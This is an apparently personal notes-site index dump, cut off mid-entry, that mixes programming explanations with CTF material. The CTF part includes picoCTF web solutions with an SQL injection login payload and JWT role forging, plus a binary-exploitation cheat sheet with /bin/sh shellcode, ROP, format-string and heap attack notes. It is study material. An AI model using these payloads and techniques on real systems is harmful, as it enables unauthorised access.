picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_58131e2c} Web # findme # login and observe traffic and flag is base64-encoded in some redirecting page. picoCTF{proxies_all_the_way_48c47a95} MatchTheRegex # Observe page source found the script tag\n... \u0026lt;script\u0026gt; function send_request() { let val = document.getElementById(\u0026#34;name\u0026#34;).value; // ^p.....F!? fetch(`/flag?input=${val}`) .then(res =\u0026gt; res.text()) .then(res =\u0026gt; { const res_json = JSON.parse(res); alert(res_json.flag) return false; }) return false; } \u0026lt;/script\u0026gt; ... So, we just enter picoCTF to match the strings then we got the flag. Flag: findme # The point is observing redirection. Use burp suite to observe every web page after you login. Then you may find something strange such as id. $\\to$ cGljb0NURntwcm94aWVzX2Fs $\\to$ bF90aGVfd2F5XzQ4YzQ3YTk1fQ==\nAnd these are base64 encoded string obviously. Flag: picoCTF{proxies_all_the_way_48c47a95}\nSOAP # raw XXE injection picoCTF{XML_3xtern@l_3nt1t1ty_53488905} More SQLi # SQLite username=\u0026amp;password='or'1'='1'-- Java Code Analysis # find JWT secret key: \u0026lsquo;1234\u0026rsquo;\nsign JWT with role \u0026lsquo;Admin\u0026rsquo;\nupdate self role as \u0026lsquo;Admin\u0026rsquo; since pdf acl get role from DB instead of JWT\nrelogin to access pdf/5\npicoCTF{w34k_jwt_n0t_g00d_6e5d7df5}\n"},{"id":345,"href":"/problem-solutions/problems-about-multiprocess/","title":"Problems About Multiprocess","section":"Problem Solutions","content":" Problems About Multiprocess # 徹底解出TypeError: cannot pickle \u0026lsquo;_thread.RLock\u0026rsquo; object，以PyTorch DDP 為例 TypeError: cannot pickle \u0026lsquo;_thread.lock\u0026rsquo; object的一個淺層解決方法 ForkingPickler can\u0026rsquo;t pickle weakref objects\n"},{"id":346,"href":"/terminology/programming-related/","title":"Programming Related","section":"Terminologies","content":" Programming Related # What is namespace in programming? # From ChatGPT 在程式語言中，namespace（命名空間）是一種用來組織和管理代碼的機制，目的是避免名稱衝突並提升代碼的可讀性和結構化。\nNamespace 的概念與作用 # 名稱分隔\n命名空間可以將代碼中的名稱（如變數、函數、類別等）組織起來，避免與其他代碼中的名稱發生衝突。\n例如，兩個不同的模組中可能都定義了名稱為 calculate 的函數，但由於它們位於不同的命名空間，因此可以共存。 代碼組織\n命名空間可以將相關聯的功能分組在一起，使代碼結構更加清晰，便於維護和重用。\n避免名稱污染\n命名空間可以避免全域命名空間中的名稱被不小心覆蓋或污染，降低了意外錯誤的可能性。\nNamespace 的具體表現 # 1. C++ # 在 C++ 中，命名空間是通過 namespace 關鍵字來實現的。\n#include \u0026lt;iostream\u0026gt; namespace Math { int add(int a, int b) { return a + b; } } namespace Physics { int add(int a, int b) { return a - b; } } int main() { std::cout \u0026lt;\u0026lt; Math::add(3, 4) \u0026lt;\u0026lt; std::endl; // 使用 Math 的 add 函數 std::cout \u0026lt;\u0026lt; Physics::add(3, 4) \u0026lt;\u0026lt; std::endl; // 使用 Physics 的 add 函數 return 0; } 2. Python # 在 Python 中，每個模組（module）本身就是一個命名空間，通過 import 來使用其他命名空間的內容。\n# math.py def calculate(): return \u0026#34;Math calculate\u0026#34; # physics.py def calculate(): return \u0026#34;Physics calculate\u0026#34; # main.py import math import physics print(math.calculate()) # 使用 math 的 calculate print(physics.calculate()) # 使用 physics 的 calculate 3. Java # 在 Java 中，命名空間是通過「包（package）」來管理的。\npackage com.example.utils; public class MathUtils { public static int add(int a, int b) { return a + b; } } // main.java import com.example.utils.MathUtils; public class Main { public static void main(String[] args) { int result = MathUtils.add(3, 4); System.out.println(result); } } 4. JavaScript # 在 JavaScript 中，命名空間可以用物件或模組的方式模擬。\nconst MathNamespace = { add: function(a, b) { return a + b; } }; const PhysicsNamespace = { add: function(a, b) { return a - b; } }; console.log(MathNamespace.add(3, 4)); // 使用 MathNamespace 的 add console.log(PhysicsNamespace.add(3, 4)); // 使用 PhysicsNamespace 的 add 5. Rust # Rust 使用模組（mod）作為命名空間的一種實現。\nmod math { pub fn add(a: i32, b: i32) -\u0026gt; i32 { a + b } } mod physics { pub fn add(a: i32, b: i32) -\u0026gt; i32 { a - b } } fn main() { println!(\u0026#34;{}\u0026#34;, math::add(3, 4)); // 使用 math 的 add println!(\u0026#34;{}\u0026#34;, physics::add(3, 4)); // 使用 physics 的 add } Namespace 的好處 # 避免命名衝突：在大型項目中，不同開發者可能使用相同名稱，命名空間可以讓它們彼此隔離。 提升可讀性：命名空間為名稱提供了上下文，開發者可以更清楚其來源。 方便管理：將功能模組化，便於管理和維護代碼。 總結 # 命名空間的核心目的是為了組織代碼並避免名稱衝突。它在不同語言中的具體實現可能有所不同，但基本理念是一致的：提供一個結構化的方式來管理代碼名稱和功能。\nWhat is decorator in Python? # 參考資料: https://myapollo.com.tw/blog/python-decorator-tutorial/ 以下為Chat-GPT提供 在 Python 中，裝飾器（decorator）是一種用於修改函數或方法行為的高級函數。裝飾器本質上是一個函數，它接受一個函數作為參數，並返回一個新的函數。裝飾器通常用於在不修改原函數代碼的情況下，添加額外的功能或行為。\n裝飾器的常見用途包括：\n記錄日誌 訪問控製和權限檢查 緩存 性能計時 輸入驗證 以下是一個簡單的裝飾器示例，用於記錄函數的執行時間：\nimport time import functools def time_it(func): @functools.wraps(func) def wrapper(*args, **kwargs): start = time.time() result = func(*args, **kwargs) end = time.time() print(f\u0026#34;{func.__name__} 执行时间: {end - start:.4f} 秒\u0026#34;) return result return wrapper @time_it def my_function(): time.sleep(2) my_function() 在這個示例中：\ntime_it 是一個裝飾器函數，它接受一個函數 func 作為參數。 在 time_it 函數內部，定義了一個 wrapper 函數。wrapper 函數在調用 func 之前記錄開始時間，在調用 func 之後記錄結束時間，並計算執行時間。 使用 @functools.wraps(func) 保留原函數的元數據（如函數名和文檔字符串），以便裝飾後的函數看起來像原函數。 time_it 函數返回 wrapper 函數。 使用 @time_it 語法將 my_function 函數應用裝飾器。這樣，當調用 my_function 時，實際上調用的是 wrapper 函數。 裝飾器可以堆疊使用，即一個函數可以被多個裝飾器裝飾，裝飾器的應用順序是從內到外。例如：\n@decorator1 @decorator2 def my_function(): pass 等价于：\ndef my_function(): pass my_function = decorator1(decorator2(my_function)) 装饰器是 Python 中非常强大的特性，可以用于简化代码、提高代码的可读性和可维护性。\n在Flask中，常常看到route也有用@這個東西，意思是一樣的嗎 # 是的，在 Flask 中，@route 裝飾器的作用與 Python 中的其他裝飾器類似。它們都是用於在不修改原始函數代碼的情況下，動態地修改函數或方法的行為。\n在 Flask 中，@app.route 裝飾器用於將 URL 路徑與視圖函數關聯起來。它的作用是告訴 Flask，當訪問特定 URL 時，應該調用哪個函數來處理請求。\n以下是一個簡單的 Flask 應用示例，展示了如何使用 @app.route 裝飾器：\nfrom flask import Flask app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def home(): return \u0026#34;Hello, World!\u0026#34; @app.route(\u0026#39;/about\u0026#39;) def about(): return \u0026#34;About Page\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 在這個示例中：\n@app.route('/') 裝飾器將根 URL (/) 與 home 函數關聯起來。當用戶訪問根 URL 時，Flask 會調用 home 函數，並將返回的字符串作為響應發送給客戶端。 @app.route('/about') 裝飾器將 /about URL 與 about 函數關聯起來。當用戶訪問 /about URL 時，Flask 會調用 about 函數，並將返回的字符串作為響應發送給客戶端。 裝飾器的作用是將函數與特定的 URL 路徑關聯起來，而不需要在函數內部處理 URL 路徑的邏輯。這使得代碼更加簡潔和易於維護。\n裝飾器在 Flask 中的使用示例展示了它們在 Web 開發中的強大功能。通過使用裝飾器，可以輕松地將 URL 路徑與視圖函數關聯起來，從而實現路由功能。裝飾器的這種特性使得代碼更加模塊化和可讀。\nWhat is CMake/GCC/G++ # CMake vs. GCC/G++ 的區別 # CMake 和 GCC/G++ 在 C/C++ 專案的開發中扮演不同的角色：\n工具 功能 GCC/G++ 編譯器，將 C/C++ 程式碼編譯成執行檔或函式庫 CMake 建構系統生成工具，用來產生 Makefile 或 Visual Studio 等建構文件，然後交給 GCC/G++ 或其他編譯器執行 CMake 不直接負責編譯，它是幫助開發者組織專案並讓編譯器（如 GCC/G++）能夠正確執行的工具。\nGCC/G++ = 工具（負責編譯程式碼） CMake = 施工藍圖（負責告訴工具如何組裝專案） 1. GCC/G++ # 🔹 GCC（GNU Compiler Collection） 是一個編譯器集合，支援多種語言，包括 C、C++、Fortran 等。\nGCC 用於編譯 C 程式 gcc main.c -o my_program G++ 用於編譯 C++ 程式 g++ main.cpp -o my_program GCC/G++ 只會處理單一或少量檔案的編譯，但對於大型專案（有很多 C++ 檔案和函式庫），管理這些文件的依賴關係會很麻煩，這時候 CMake 就能派上用場。\n2. CMake # 🔹 CMake 是一個建構系統生成工具，它會根據 CMakeLists.txt 檔案產生適合當前環境的建構文件，例如：\nLinux/macOS → Makefile Windows（Visual Studio） → .sln 工程檔 Ninja → build.ninja 然後，你可以使用 make 或 ninja 來執行實際的編譯。\nCMake 典型用法 # mkdir build \u0026amp;\u0026amp; cd build cmake .. # 產生 Makefile make -j$(nproc) # 使用 Make 來編譯 CMake 不會直接執行 gcc 或 g++，但它會根據專案的需求自動選擇合適的編譯器。\nCMake 與 GCC/G++ 的關係 # CMake 和 GCC/G++ 其實是互補關係，CMake 負責管理建構過程，然後讓 GCC/G++ 執行編譯。\n在 CMake 的 CMakeLists.txt 檔案中，你可以指定使用 GCC：\nset(CMAKE_C_COMPILER gcc) set(CMAKE_CXX_COMPILER g++) 然後執行 CMake 時，它就會使用 GCC/G++ 來編譯程式碼。\n何時使用 CMake？ # 場景 適合工具 編譯單個 C/C++ 檔案 gcc / g++ 小型專案（幾個檔案） make 大型專案（多個目錄、函式庫、跨平台） CMake g++ vs. gcc 的主要區別 # 比較項目 gcc g++ 主要用途 編譯 C 程式 編譯 C++ 程式 編譯 C++ 時是否自動連結標準函式庫 ❌ 否，需要手動加 -lstdc++ ✅ 是，會自動連結 libstdc++ 檔案預設行為 預設識別 .c 為 C 語言 預設識別 .cpp 為 C++ 語言 C++ 語法支援 部分支援，但預設不啟用 C++ 標準 完整支援 C++ 1. gcc 編譯 C 程式 # 如果你用 gcc 編譯 C 程式：\ngcc main.c -o main 它會使用 C 語言的編譯規則。\n2. gcc 編譯 C++ 程式（需要手動指定標準庫） # 如果你用 gcc 編譯 C++ 程式：\ngcc main.cpp -o main 這會產生錯誤，因為 gcc 不會自動連結 C++ 標準函式庫。你必須手動加上 -lstdc++：\ngcc main.cpp -lstdc++ -o main 3. g++ 編譯 C++ 程式（推薦方式） # 如果你用 g++ 編譯 C++ 程式：\ng++ main.cpp -o main 它自動連結 C++ 標準函式庫，不用額外加 -lstdc++，是推薦的方式。\n4. gcc 和 g++ 在多檔案專案的行為 # 混合 C 和 C++ 的專案 # 假設我們有兩個檔案：\nmain.cpp（C++ 代碼） utils.c（C 代碼） 用 gcc 來編譯（需要手動連結 C++ 標準庫）：\ngcc main.cpp utils.c -lstdc++ -o main 用 g++ 來編譯：\ng++ main.cpp utils.c -o main g++ 會自動連結 libstdc++，所以更方便。\n結論：該用哪個？ # 情境 建議工具 純 C 程式 gcc 純 C++ 程式 g++ C 和 C++ 混合專案 g++（因為它會自動連結 C++ 標準庫） 如果你的專案主要是 C++，優先使用 g++，因為它會處理 C++ 標準函式庫連結。如果是 C，則用 gcc。\n"},{"id":347,"href":"/tools/ctf/pwn-overview/","title":"PWN Overview","section":"Tools","content":" PWN Overview # :::spoiler TOC [TOC] :::\nTools Cheat # Commonly Used Commands $ file {file path} $ checksec {file path} # sudo apt-get install checksec $ objdump -M intel -d {file path} | less $ gdb {file path} # sudo apt-get install gdb $ readelf -a {file path} | less # 查看所有資訊，包含section/file-header/program headers/symbol tables/等等 $ readelf -S {file path} # 只查看sections\u0026#39; header $ ldd {file path} # to check what libraries the file used Command Used Tools / Plugin gdb-peda $ git clone https://github.com/longld/peda.git ~/peda $ echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit radare2 $ git clone https://github.com/radare/radare2.git $ sudo apt install build-essential # just for wsl $ sudo ./radare2/sys/install.sh Exploit DB - Shell Code：如果要寫shell code的話可以直接看exploit db上別人寫好的gadget，複製起來就可以用了，不過有時候也有可能會失敗，在確認其他東西都是正確的情況下，可以試看看別的，記得平台要選對 ROPgadget $ sudo apt install python3-pip $ sudo -H python3 -m pip install ROPgadget $ ROPgadget --help # For using $ ROPgadget --binary {executed file} | grep \u0026#39;pop rax.*ret\u0026#39; # Or $ ROPgadget --binary {executed file} --only \u0026#34;pop|ret|syscall\u0026#34; \u0026gt; rop_gadget.txt $ ROPgadget --binary {executed file} --only \u0026#34;pop|ret|syscall\u0026#34; --multibr \u0026gt; rop_gadget.txt # multibr是multi bransh允許多分支的gadget # 取得特定string的gadget $ ROPgadget --binary {executed file} --string \u0026#34;/bin/sh\u0026#34; one_gadget $ sudo apt install rubygems $ sudo gem install one_gadget $ one_gadget {libc file} seccomp-tools $ sudo apt install gcc ruby-dev $ gem install seccomp-tools $ seccomp-tools dump ./test 找glibc版本的online tool libc-database search API Search libc database search gdb # :::spoiler 常用語法(cheat)\nb: 設定中斷點 # break point (gdb) b main (gdb) b *0x4896aa r: 執行程式 # run $ (gdb) r c: 繼續執行 # continue $ (gdb) c si: 步入指令 # step instruction $(gdb) si ni: 步過指令 # next instruction $ (gdb) ni x: 顯示記憶體內容 # show the value stored in memory address (gdb) x/10gx 0x400686 # print 10 memory value from 0x400686 (gdb) x/10gi 0x400686 # print 10 instruction from 0x400686 (gdb) x/2gs 0x400686 # print 2 strings from 0x400686 vmmap 查看address space # check memory permission and distribution $ (gdb) vmmap bt {number}: 查看call stack b info: 查看目前設的break point delete breakpoints 1: 刪除一號斷點 fin: 直接執行該function到結束 got: 直接查看GOT canary: 直接查看canary存放的位置和value heap (chunk|chunks|bins|arenas|set-arena) j/jump {address}: 直接jmp到指定的位置，但要注意如果該位置之後沒有其他breakpoint就會直接執行下去 # jump $ (gdb) j 0x4896aa set {long}{address} = 0x61616161: 對特定的位址寫入值 # set memory / register value $ (gdb) set $rax=0x5 p \u0026amp;{symbol}: print出特定的symbol 如果自己寫一個script讓gdb可以自己load的話可以用: $ gdb -x {script name} {file name} script範例 set LD_PRELOAD=/usr/src/glibc/glibc_dbg/libc.so.6 b main r heapinfo: 查看heap的狀態 heapb: 就是heap base的command，告訴我們目前的base address .gdbinit :::spoiler config set disassembly-flavor intel define gef source ~/.gdbinit-gef.py #### gef # gef setting gef config dereference.max_recursion 2 gef config context.layout \u0026#34;regs code args source memory stack trace\u0026#34; gef config context.nb_lines_backtrace 3 gef config context.redirect /dev/pts/2 end define peda #source ~/peda/peda.py source ~/Pwngdb/pwngdb.py source ~/Pwngdb/angelheap/gdbinit.py define hook-run python import angelheap angelheap.init_angelheap() end end end ::: pwntools # 常用 raw_input() p64(0x401111) p32(0x401111) r.recvline() r.recvuntil(b\u0026#39;test\u0026#39;) r.recv(6) r.sendline(b\u0026#39;test\u0026#39;) flat payload = flat( pop_eax_ret, 0, pop_ebx_ret, 0xc ) asm: payload = asm(\u0026#34;\u0026#34;\u0026#34; xor eax, eax xor ebx, ebx \u0026#34;\u0026#34;\u0026#34;) context context.arch = \u0026#39;amd64\u0026#39; context.newline = b\u0026#39;\\r\\n\u0026#39; # for windows pe file ELF 方便查看GOT或function的address exe = ELF(\u0026#39;./vuln\u0026#39;) log.info(\u0026#34;main address: \u0026#34; + hex(exe.symbols[\u0026#39;main\u0026#39;])) log.info(\u0026#34;pow GOT address: \u0026#34; + hex(exe.got[\u0026#39;pow\u0026#39;])) log.info(\u0026#34;strcspn GOT address: \u0026#34; + hex(exe.got[\u0026#39;strcspn\u0026#39;])) shellcraft pwntools中內建的一些assembly shell code Other # objdump $ objdump -M intel -d $binary | less 如果要寫shell code的話可以直接看exploit db上別人寫好的gadget，複製起來就可以用了，不過有時候也有可能會失敗，在確認其他東西都是正確的情況下，可以試看看別的，記得平台要選對 Exploit DB - Shell Code Linux System Call Table Linux System Call Table for x86 64 寫/bin/sh\\x00的方法 # Shellcode Cheat Sheet 如果是x86版本 建議直接寫在stack上，因為比較少int 0x80 ; ret的gadget可以用，那倒不如直接寫在script上然後計算esp或ebp的位置，一樣可以拿到儲存的位置 如果是x64版本 建議可以用system read的方式搭配syscall ret的ROP 如果是直接執行shell code 且shell code是可以直接讓我們輸入的話就直接參考exploit db的就好了 :::spoiler eg 1 push 0x0b pop eax push 0x0068732f push 0x6e69622f mov ebx, esp int 0x80 ::: :::spoiler eg 2\nmov eax, 0x6e69622f push eax mov eax, 0x0068732f push eax xor eax, eax xor ebx, ebx xor ecx, ecx xor edx, edx mov eax, 0xb lea ebx, DWORD PTR [esp] int 0x80 ::: :::spoiler eg 3\n/*Put the syscall number of execve in eax*/ xor eax, eax mov al, 0xb /*Put zero in ecx and edx*/ xor ecx, ecx xor edx, edx /*Push \u0026#34;/sh\\x00\u0026#34; on the stack*/ xor ebx, ebx mov bl, 0x68 shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx mov bh, 0x73 mov bl, 0x2f push ebx nop /*Push \u0026#34;/bin\u0026#34; on the stack*/ mov bh, 0x6e mov bl, 0x69 shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx shl ebx mov bh, 0x62 mov bl, 0x2f push ebx nop /*Move the esp (that points to \u0026#34;/bin/sh\\x00\u0026#34;) in ebx*/ mov ebx, esp/*Syscall*/ int 0x80 :::\n如何讓環境執行在指定的libc和loader中 # 如果不想要費事裝VM或wsl就可以直接用@ccccc提供的腳本，讓這支程式跑在和server一樣的環境，==所以要把對應環境的loader和libc載下來==，用法如下:\n$ python {script path} {new env loader path} {original elf file} # e.g. python ./LD_PRELOAD.py ./ld-2.27.so ./vuln 他會產生一個新的執行檔，名字是V，在pwntools寫的腳本也要改，用法如下\nr = process(\u0026#39;./V\u0026#39;,env={\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;./libc-2.27.so\u0026#34;}) :::spoiler Script\n\u0026#39;\u0026#39;\u0026#39; Copied and modified from https://www.cnblogs.com/0x636a/p/9157993.html All credits ro original author \u0026#39;\u0026#39;\u0026#39; from pwn import * import sys, os def change_ld(binary, ld): \u0026#34;\u0026#34;\u0026#34; Force to use assigned new ld.so by changing the binary \u0026#34;\u0026#34;\u0026#34; if not os.access(ld, os.R_OK): log.failure(\u0026#34;Invalid path {} to ld\u0026#34;.format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure(\u0026#34;Invalid path {} to binary\u0026#34;.format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header[\u0026#39;p_type\u0026#39;] == \u0026#39;PT_INTERP\u0026#39;: size = segment.header[\u0026#39;p_memsz\u0026#39;] addr = segment.header[\u0026#39;p_paddr\u0026#39;] data = segment.data() if size \u0026lt;= len(ld): log.failure(\u0026#34;Failed to change PT_INTERP from {} to {}\u0026#34;.format(data, ld)) return None binary.write(addr, ld.encode().ljust(size, b\u0026#39;\\0\u0026#39;)) path = binary.path.split(\u0026#39;/\u0026#39;)[-1][0].upper() if os.access(path, os.F_OK): os.remove(path) print(\u0026#34;Removing exist file {}\u0026#34;.format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ print(\u0026#34;PT_INTERP has changed from {} to {}. Using temp file {}\u0026#34;.format(data, ld, path)) return if len(sys.argv)!=3: print(\u0026#39;Usage : python3 LD_PRELOAD.py [ld] [bin]\u0026#39;) LD_PATH = sys.argv[1] BIN = sys.argv[2] change_ld(BIN, LD_PATH) ###Execute file by \u0026#39;LD_PRELOAD={target_libc} ./executable\u0026#39; :::\nHow to download libc file \u0026amp; loader Ubuntu Packages Search libc6_2.31-0ubuntu9_amd64.deb Stack Vulnerabilities # checksec # No RELRO or Partial RELRO $\\to$ ==GOT Hijacking(改寫GOT)== :::spoiler ❖ No RELRO - link map和GOT都可寫(有lazy binding) ❖ Partial RELRO - link map不可寫，GOT可寫(有lazy binding) ❖ Full RELRO - link map和GOT都不可寫(事先把library的位置都先resolve完並寫在GOT上，再把GOT權限關掉，比較花時間但安全) 關閉指令：-z norelro ::: Position Independent Executable(PIE) $\\to$ ==BOF(ret2 series)== :::spoiler ❖ 開啟時，data 段以及 code 段位址隨機化 ❖ 關閉時，data 段以及 code 段位址固定 關閉指令：-no-pie ::: NX (No eXecute, Data Execution Prevention, DEP) off $\\to$ 基本上不能直接執行shellcode，但可以用==ROP==繞過 :::spoiler ❖ 可寫得不可執⾏，可執⾏的不可寫 關閉指令：-zexecstack ::: ASLR (Address Space Layout Randomization) :::spoiler ❖ 記憶體位址隨機變化 ❖ 每次執⾏時，stack、heap、library 位置都不⼀樣 關閉指令: sudo sh -c \u0026quot;echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\u0026quot; 打開指令: sudo sh -c \u0026quot;echo 2 \u0026gt; /proc/sys/kernel/randomize_va_space\u0026quot; ::: Stack Canary 關閉指令：-fno-stack-protector Bof Series # Overwrite sensitive data Overwrite return address -\u0026gt; Statically Link Binary: 可以直接試看看ROP chain(從binary本身找gadget) Dynamically Link Binary: 看有沒有辦法leak出libc base address，再用ROP chain(從libc中找gadget) Canary Leak canary 如果BoF的長度不夠的話，可以考慮用stack pivot的方式再搭配ROP chain: 範例可以參考Lab - Stack Pivot Format String Bug # 之前的Demo是利用format string達到==GOT hijack== 用法: %p - leak code / libc / stack address %{任意值}c%k$(hhn|hn|n) - 寫任意值到第 k 個參數指向的位址 %Xc - 印出 X 個字元 k$ - 指定第 k 個參數 %(hhn|hn|n) - 將輸出的字元數以 1 / 2 / 4 bytes 寫到參數指向的位址 若該值為 addr 可透過 %s 輸出該地址的 value Note: 因為能控制寫入的⼤⼩與位址，因此也可以配合 partial overwrite 做 exploit 基本上不太會⽤ %k$n 此 format，因為⼀次寫入 4 bytes 會太多 GOT Series # GOT hijacking Ret2plt - 控制執⾏流程到 function@plt，也代表執⾏該 function (以 functionA 代稱)，詳細可以看0x32 Ret2Plt Leak libc - functionA 在被解析後，GOT 會存放 functionA 的絕對位址，因此如果可以讀取 GOT，就能得到位於 library 當中的 address FunctionA 的絕對位址減去他在 library 當中的 offset，能得到 library base address，繞過 ASLR Ret2libc - 有了 library base address，也能加上其他 function 的 offset 來取得該 function 在 library 中的位址 (以 functionB 代稱)藉由控制程式流程，讓程式跳到 functionB 上，意即執⾏此 functionB Return 2 Series # Return 2 Code 這是代表原本的source code就已經有寫好一個shell，只要改變RIP就可以跳過去 必要條件：PIE Off Return 2 Shell Code 代表我們要自己寫一個shell code在記憶體中，然後用RIP跳過去 必要條件：NX Off(要完全可讀可寫可執行) 作法就是先找到一塊rwx全開的地方，然後想辦法把shell code寫上去，接著控制RIP跳到該段拿到shell 變形：就像1和2一樣 可以先找到.bss section，然後開__libc_read function寫入/bin/sh\\x00，之後再return到shell code的地方 Return 2 libc Heap Vulnerabilities # Background # :::spoiler 解題關鍵 :::\nDouble Free # Used After Free # UAF leak Libc address UAF leak heap address 基本的練習可以看UAF++ Tcache poisoning # 使⽤ double free 讓 tcache 當中存在兩個相同的 chunk，並利⽤修改 fd的⽅式，將對應位址視為 chunk 分配給 user\nTcache 拿 chunk 時並不會檢查 chunk size 是否合法，因此常會拿 __free_hook 寫 system Protection 1 - 當釋放 chunk 時，如果 chunk + 8 (key) 位置的值與當前 heap 的\u0026amp;tcache_struct 相等，則會遍歷所有 entry，檢查是否有相同的 chunk，確保沒有double free 的發⽣ Protection 2 - 當取出 chunk 時，會檢查對應⼤⼩的 counter 是否⼤於 0，如果是的話才會取出 tcache_struct 當中指向的第⼀塊 chunk Bypass Protection 1 - 透過 UAF 或是 heap overflow，修改 chunk 的 key 欄位 Bypass Protection 2 拿到 tcache_struct 的 chunk 後修改 counts 欄位成非 0 的值 多次 free 相同的 chunk Overlapping chunks # 簡單來說就是==修改chunk size==，讓 chunk 在被釋放時 trigger consolidation(當釋放記憶體時，若檢查到相鄰的 chunk 沒有被使⽤，會將其合併成⼀塊更⼤的 freed chunk)，使得正在使⽤的 chunk 與已經釋放的 chunk 有部分重疊，也就代表\n使⽤中的 chunk 可以更改 freed chunk 中的 fd、bk freed chunk 在被分配時，會分配到與使⽤中的 chunk 相同的區塊，可以修改敏感資料 Reference # Guessing Game 1\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSimple PWN - 0x12(Lab - rop++)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":348,"href":"/problem-solutions/pwndbg-installation-problems/","title":"pwndbg installation problems","section":"Problem Solutions","content":" pwndbg installation problems # Normal Installation # $ git clone https://github.com/pwndbg/pwndbg $ cd pwndbg $ ./setup.sh Problem I # The following information may help to resolve the situation: The following packages have unmet dependencies: python3-venv : Depends: python3.8-venv (\u0026gt;= 3.8.2-1~) but it is not going to be installed Depends: python3 (= 3.8.2-0ubuntu2) but 3.10.4-0ubuntu2 is to be installed E: Unable to correct problems, you have held broken packages. 如果遇到這種的問題，就直接分析setup.sh是crash在哪邊，照理說應該是跟python的版本有關係，想我的狀況是原本安裝python3的version是3.10，而不是3.8，所以最直接的做法是修改setup.sh file，在第23行的地方修改一下，直接指定安裝的版本，另外\n# original sudo apt-get install -y git gdb gdbserver python3-dev python3-venv python3-pip python3-setuptools libglib2.0-dev libc6-dbg # revised sudo apt-get install -y git gdb gdbserver python3-dev=3.8.2-0ubuntu2 python3-venv=3.8.2-0ubuntu2 python3-pip python3-setuptools libglib2.0-dev libc6-dbg 另外如果gdb吃的python版本不是3.8，就需要直接指定，也就是在第172行的地方新增版本 $ PYVER=$(gdb -batch -q --nx -ex \u0026#39;pi import platform; print(\u0026#34;.\u0026#34;.join(platform.python_version_tuple()[:2]))\u0026#39;) $ PYVER=\u0026#34;3.8\u0026#34; # 直接指定，上面那行不要刪掉 然後安裝python3.8 $ sudo apt install python3.8 如果還是不行就強制把python3的版本改成3.81 $ sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 1 此時應該會看到dpkg -l|grep python中，python3的結果應該是3.8.2-0ubuntu2 如果都不行，就全部砍掉2，語法如下，理論上應該就沒剩多少了，如果查看python會發現沒有這個command\n$ sudo apt-get remove --auto-remove python3.10 $ sudo apt-get remove --auto-remove python3. $ dpkg -l|grep python 此時應該就可以正常安裝了$ ./setup.sh.\nProblem II # $ gdb GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90 Copyright (C) 2022 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details. This GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;. Type \u0026#34;show configuration\u0026#34; for configuration details. For bug reporting instructions, please see: \u0026lt;https://www.gnu.org/software/gdb/bugs/\u0026gt;. Find the GDB manual and other documentation resources online at: \u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;. For help, type \u0026#34;help\u0026#34;. Type \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;... Traceback (most recent call last): File \u0026#34;/home/sbk6401/pwndbg/gdbinit.py\u0026#34;, line 68, in \u0026lt;module\u0026gt; import pwndbg # noqa: F401 File \u0026#34;/home/sbk6401/pwndbg/pwndbg/__init__.py\u0026#34;, line 9, in \u0026lt;module\u0026gt; import pwndbg.commands File \u0026#34;/home/sbk6401/pwndbg/pwndbg/commands/__init__.py\u0026#34;, line 17, in \u0026lt;module\u0026gt; from pwndbg.heap.ptmalloc import DebugSymsHeap File \u0026#34;/home/sbk6401/pwndbg/pwndbg/heap/ptmalloc.py\u0026#34;, line 19, in \u0026lt;module\u0026gt; import pwndbg.disasm File \u0026#34;/home/sbk6401/pwndbg/pwndbg/disasm/__init__.py\u0026#34;, line 13, in \u0026lt;module\u0026gt; import capstone File \u0026#34;/home/sbk6401/pwndbg/.venv/lib/python3.8/site-packages/capstone/__init__.py\u0026#34;, line 326, in \u0026lt;module\u0026gt; import distutils.sysconfig ModuleNotFoundError: No module named \u0026#39;distutils.sysconfig\u0026#39; Reading symbols from chal... (No debugging symbols found in chal) Python Exception \u0026lt;class \u0026#39;ModuleNotFoundError\u0026#39;\u0026gt;: No module named \u0026#39;distutils.sysconfig\u0026#39; (gdb) 碰到這個問題的前提是已經安裝好了(setup的部分完成)，那就直接安裝python3-distutils就好了\n$ sudo apt-get install python3-distutils Problem III # 如果是沒有Pwngdb的folder的話就直接拿已經安裝好的電腦，然後複製整個資料夾到~/就好了\nProblem IV # 如果下gdb發現沒有使用任何plugin就要檢查.gdbinit的檔案怎麼寫，例如我的文件有gef和pwndbg，如果要使用其中一種，另外一個就要全部註解，才不會出錯\n# source ~/.gdbinit-gef.py #### gef # gef setting # gef config dereference.max_recursion 2 # gef config context.layout \u0026#34;regs code args source memory stack trace\u0026#34; # gef config context.nb_lines_backtrace 3 # gef config context.redirect /dev/pts/1 #### pwndbg source /home/sbk6401/pwndbg/gdbinit.py source /home/sbk6401/Pwngdb/pwngdb.py source /home/sbk6401/Pwngdb/angelheap/gdbinit.py define hook-run python import angelheap angelheap.init_angelheap() end end 到最後安裝的結果就會如下 :::spoiler Complete Result\n$ dpkg -l|grep python ii libpython3-dev:amd64 3.10.4-0ubuntu2 amd64 header files and a static library for Python (default) ii libpython3-stdlib:amd64 3.10.4-0ubuntu2 amd64 interactive high-level object-oriented language (default python3 version) ii libpython3.10:amd64 3.10.4-3 amd64 